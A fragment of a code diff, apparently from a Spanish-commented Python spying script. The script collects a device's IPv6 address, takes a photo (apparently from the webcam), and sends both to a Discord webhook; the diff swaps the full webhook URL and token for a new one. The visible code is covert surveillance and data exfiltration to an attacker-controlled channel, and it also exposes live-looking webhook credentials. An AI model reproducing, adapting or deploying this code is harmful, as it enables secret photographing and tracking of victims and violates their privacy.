@@ -79,7 +79,7 @@ ipv6 = get_ipv6()
 photo_path = take_photo()
 
 # URL del webhook de Discord
-webhook_url = "https://discord.com/api/webhooks/1282017804534546595/L8ehmnpIMxrXPjOqiQutLay-lEZNKWOYRQj6LRB8wPJLEmpHVbFR2XG2qmVYckUdSKYD"
+webhook_url = "https://discord.com/api/webhooks/1285044311339044915/Aii38K2XtAvrJePQTLk5JzNyMb5_2GWGPm-5Nu6Zba2ybt65QWApErpSzoKoZymKyLCR"
 
 # Enviar los datos al webhook de Discord
 if ip and photo_path:
